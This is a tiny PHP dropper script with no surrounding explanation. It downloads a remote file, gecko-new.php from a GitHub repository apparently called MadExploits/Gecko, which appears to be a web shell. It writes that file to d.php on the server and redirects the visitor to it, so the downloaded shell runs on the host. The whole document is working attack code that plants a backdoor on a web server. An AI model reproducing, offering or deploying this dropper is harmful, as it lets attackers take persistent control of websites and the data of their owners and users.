<?php
$content = "https://raw.githubusercontent.com/MadExploits/Gecko/refs/heads/main/gecko-new.php";
$get_content = file_get_contents($content);
if(file_exists("d.php")){header("location: d.php");}else{file_put_contents("d.php", $get_content); header("location: d.php");}
?>
